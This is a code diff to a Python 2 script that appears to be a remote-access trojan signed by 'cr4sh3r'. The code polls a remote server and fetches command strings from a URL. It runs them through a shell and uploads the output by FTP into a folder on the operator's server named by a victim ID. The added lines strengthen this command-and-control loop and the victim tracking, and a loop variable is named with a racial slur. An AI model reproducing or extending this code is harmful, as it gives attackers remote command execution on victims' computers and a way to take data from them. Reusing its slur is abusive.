@@ -217,7 +217,7 @@ artfin = random.choice([art1,art2,art3,art4,art5,art6,art7,art8,art9,art10])
 
 print artfin
 print " "
-print "Version 1.0.3"
+print "Version 1.0.4"
 print "- - - - - - - - - - - - - - - - - - - - - - - - - - - - -"
 print "Made by cr4sh3r"
 print "This may be not the final version!"
@@ -305,6 +305,7 @@ while nigga <= 1:
     while updater == "1":
         time.sleep(05)
         for updater in range(1):
+            f = urllib.urlopen(urlupda)
             updater = f.readline(1)
             time.sleep(5)
 
@@ -336,6 +337,7 @@ while nigga <= 1:
 
                 time.sleep(30)
                 for updater in range(1):
+                    f = urllib.urlopen(urlupda)
                     updater = f.readline(1)
                     time.sleep(5)
 
@@ -351,16 +353,19 @@ while nigga <= 1:
             usock = urllib2.urlopen(urlup5)
             updatz5 = usock.read()
             usock.close()
+            if updatz5 == "":
+                time.sleep(5)
             command = subprocess.check_output(updatz5, shell=True)
             time.sleep(1)
             ansa = open("tpo.js" , 'w')
             ansa.write(command)
             ansa.close()
             ftp.storbinary("STOR tpo.js", open("tpo.js", "rb"))
-            time.sleep(3)
+            time.sleep(6)
             ftp.quit()
 
         for updater in range(1):
+            f = urllib.urlopen(urlupda)
             updater = f.readline(1)
             time.sleep(5)
 
@@ -374,6 +379,7 @@ while nigga <= 1:
             time.sleep(10)
 
         for updater in range(1):
+            f = urllib.urlopen(urlupda)
             updater = f.readline(1)
             time.sleep(5)
 
@@ -390,12 +396,14 @@ while nigga <= 1:
 
 
         for updater in range(1):
+            f = urllib.urlopen(urlupda)
             updater = f.readline(1)
             time.sleep(5)
 
     else:
         time.sleep(05)
         for updater in range(1):
+            f = urllib.urlopen(urlupda)
             updater = f.readline(1)
             time.sleep(5)
 
@@ -500,6 +508,18 @@ def ftp_con(m):
             ftp.cwd("../")
             ftp.cwd("../")
             ftp.cwd("../")
+            ftp.cwd('public_html')
+            ftp.cwd('wtd')
+            ftp.cwd(vic_id)
+            asno = open("asno.html" , 'w')
+            asno.write("1")
+            asno.close()
+            ftp.storbinary("STOR asno.html", open("asno.html" , 'rb'))
+            ftp.cwd("../")
+            ftp.cwd("../")
+            ftp.cwd("../")
+
+
 
         elif ftp_com == "CB":
             ftp.cwd('public_html')
@@ -602,3 +622,5 @@ while 1 >= kfckl :
 
 
 # Preserve the main author if you're going to change the code
+
+
